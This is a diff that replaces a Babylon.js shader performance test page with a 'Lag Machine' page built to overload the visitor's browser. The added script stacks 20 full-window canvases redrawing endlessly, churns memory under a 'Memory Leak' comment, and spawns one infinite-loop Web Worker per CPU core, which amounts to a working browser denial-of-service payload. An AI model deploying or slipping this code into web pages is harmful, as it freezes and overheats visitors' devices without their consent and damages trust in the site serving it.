@@ -1,172 +1,113 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Volume Shader Performance Test</title>
-    <style>
-        body { margin: 0; overflow: hidden; }
-        canvas { display: block; }
-        #fpsDisplay {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background-color: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 5px;
-            font-family: sans-serif;
-            z-index: 1000;
-        }
-    </style>
+<title>Lag Machine</title>
+<style>
+body { font-family: sans-serif; }
+#fps { position: fixed; top: 10px; right: 10px; background: white; padding: 5px; border: 1px solid black; }
+</style>
 </head>
 <body>
-    <canvas id="renderCanvas"></canvas>
-    <div id="fpsDisplay">FPS: 0</div>
-    <script>
-        const canvas = document.getElementById('renderCanvas');
-        const engine = new BABYLON.Engine(canvas, true);
-        const fpsDisplay = document.getElementById('fpsDisplay');
-        let frameCount = 0;
-        let lastTime = performance.now();
 
-        const createScene = function () {
-            const scene = new BABYLON.Scene(engine);
-            const camera = new BABYLON.ArcRotateCamera("camera", -Math.PI / 2, Math.PI / 2.5, 5, new BABYLON.Vector3(0, 0, 0), scene);
-            camera.attachControl(canvas, true);
-            
-            // Ensure that the camera is not inside the box
-            camera.setPosition(new BABYLON.Vector3(0, 0, 5));
+<h1>Lag Test</h1>
+<div id="fps">FPS: 0</div>
 
+<script>
+const fpsDisplay = document.getElementById('fps');
+let frameCount = 0;
+let lastFrameTime = performance.now();
 
-            const shaderMaterial = new BABYLON.ShaderMaterial("shader", scene, {
-                vertexSource: `
-                precision highp float;
-                attribute vec3 position;
-                uniform mat4 worldViewProjection;
-                varying vec3 vPosition;
+function updateFPS() {
+    const now = performance.now();
+    const elapsed = now - lastFrameTime;
+    const fps = Math.round(1000 / elapsed);
 
-                void main(void) {
-                  vPosition = position;
-                  gl_Position = worldViewProjection * vec4(position, 1.0);
-                }
-              `,
-                fragmentSource: `
-                precision highp float;
-                varying vec3 vPosition;
-                uniform float time;
-                uniform vec3 cameraPos;
+    fpsDisplay.textContent = `FPS: ${fps}`;
+    lastFrameTime = now;
+}
 
-                float hash(float n) { return fract(sin(n) * 43758.5453123); }
+function runLag() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    document.body.appendChild(canvas);
 
-                float noise(vec3 p)
-                {
-                    vec3 ip = floor(p);
-                    vec3 fp = fract(p);
-                    
-                    vec4 c00 = texture2D(noiseTex, (ip.xy + vec2(0, 0))/ 256.0);
-                    vec4 c10 = texture2D(noiseTex, (ip.xy + vec2(1, 0))/ 256.0);
-                    vec4 c01 = texture2D(noiseTex, (ip.xy + vec2(0, 1))/ 256.0);
-                    vec4 c11 = texture2D(noiseTex, (ip.xy + vec2(1, 1))/ 256.0);
+    function drawFrame() {
+        for (let i = 0; i < 1000; i++) {
+            ctx.beginPath();
+            ctx.fillStyle = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;
+            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 10 + Math.random() * 30, 0, 2 * Math.PI);
+            ctx.fill();
+        }
+        updateFPS();
+        requestAnimationFrame(drawFrame);
+    }
 
-                    float n0 = mix(c00.r, c10.r, fp.x);
-                    float n1 = mix(c01.r, c11.r, fp.x);
-                    float n2 = mix(n0, n1, fp.y);
-                    
-                    
-                    vec4 c00z = texture2D(noiseTex, (ip.zy + vec2(0, 0))/ 256.0);
-                    vec4 c10z = texture2D(noiseTex, (ip.zy + vec2(1, 0))/ 256.0);
-                    vec4 c01z = texture2D(noiseTex, (ip.zy + vec2(0, 1))/ 256.0);
-                    vec4 c11z = texture2D(noiseTex, (ip.zy + vec2(1, 1))/ 256.0);
+    drawFrame();
+}
 
-                    float n3 = mix(c00z.r, c10z.r, fp.y);
-                    float n4 = mix(c01z.r, c11z.r, fp.y);
-                    
-                    float nz = mix(n3, n4, fp.z);
-                    
-                   return mix(n2, nz, fp.z) ;
-                }
+runLag();
 
+// Exploit vulnerabilities in the rendering system with nested loops and multiple canvases
 
-               float fbm(vec3 p)
-              {
-                  float f = 0.0;
-                  f += noise(p) * 0.5;
-                  p *= 2.0;
-                  f += noise(p) * 0.25;
-                   p *= 2.0;
-                  f += noise(p) * 0.125;
-                   p *= 2.0;
-                   f += noise(p) * 0.0625;
-                  p *= 2.0;
-                   f += noise(p) * 0.03125;
-                   
-                  return f;
-              }
+function createLagLoop() {
+    const canvasContainer = document.createElement('div');
+    canvasContainer.style.position = 'absolute';
+    canvasContainer.style.top = 0;
+    canvasContainer.style.left = 0;
+    canvasContainer.style.pointerEvents = 'none';
 
-               float volume(vec3 pos)
-                {
-                   vec3 p = pos * 3.0;
-                  return fbm(p);
-                }
+    document.body.appendChild(canvasContainer);
 
-                void main(void) {
-                    vec3 rayDirection = normalize(vPosition - cameraPos);
-                    float density = 0.0;
-                   float stepSize = 0.01;
+    const canvasCount = 20;
+    for(let i = 0; i < canvasCount; i++) {
+        const canvas = document.createElement('canvas');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        canvas.style.position = 'absolute';
+        canvas.style.top = 0;
+        canvas.style.left = 0;
+        canvas.style.opacity = 0.1;
+        const ctx = canvas.getContext('2d');
+        canvasContainer.appendChild(canvas);
 
-                   vec3 samplePos;
-                   float maxSteps = 100.0;
-                  for(float i = 0.0; i < maxSteps; i++){
-                       samplePos = cameraPos + rayDirection * i * stepSize;
-                       density+= volume(samplePos) * stepSize;
-                       if(density > 1.0) break;
-                    }
-                   float alpha = min(density,1.0);
-                  vec3 color = vec3(alpha);
-                   gl_FragColor = vec4(color, alpha);
-                }
-              `
-            },
-            {
-              attributes: ["position"],
-              uniforms: ["worldViewProjection", "time", "cameraPos"],
-            });
+        const numCircles = 200;
+        function drawCircles() {
+            for (let j = 0; j < numCircles; j++) {
+                ctx.fillStyle = `hsl(${j * 15 + 100}, 100%, 50%)`;
+                ctx.beginPath();
+                ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 10, 0, 2 * Math.PI);
+                ctx.fill();
 
-
-            const box = BABYLON.MeshBuilder.CreateBox("box", { size: 3 }, scene);
-            box.material = shaderMaterial;
-            const noiseTex =  new BABYLON.Texture("https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/PerlinNoise.png/300px-PerlinNoise.png", scene);
-            shaderMaterial.setTexture("noiseTex", noiseTex);
-
-            scene.onBeforeRenderObservable.add(() => {
-                shaderMaterial.setFloat("time", engine.getDeltaTime() * 0.001);
-                shaderMaterial.setVector3("cameraPos", camera.position);
-                 frameCount++;
-            });
-
-            return scene;
-        };
-
-        const scene = createScene();
-
-        engine.runRenderLoop(function () {
-            scene.render();
-             const currentTime = performance.now();
-            const deltaTime = currentTime - lastTime;
-            if (deltaTime >= 1000) {
-                const fps = Math.round(frameCount / (deltaTime / 1000));
-                fpsDisplay.textContent = "FPS: " + fps;
-                frameCount = 0;
-                lastTime = currentTime;
             }
+            requestAnimationFrame(drawCircles)
+        }
+        drawCircles()
+    }
+}
 
-        });
+createLagLoop();
 
-        window.addEventListener('resize', function(){
-            engine.resize();
-        });
-    </script>
-    <script src="https://cdn.babylonjs.com/babylon.js"></script>
-    <script src="https://cdn.babylonjs.com/materialsLibrary/babylonjs.materials.min.js"></script>
+// Memory Leak
+setInterval(() => {
+    let bigString = '';
+    for (let i = 0; i < 10000; i++) {
+        bigString += 'Long String';
+    }
+
+}, 100);
+
+// Web worker for additional load on all cores
+for (let i = 0; i < navigator.hardwareConcurrency; i++) {
+    const worker = new Worker(URL.createObjectURL(new Blob([`
+        while(true) {
+            Math.sqrt(Math.random() * 100000);
+        }
+    `], {type: 'text/javascript'})));
+}
+
+</script>
+
 </body>
 </html>
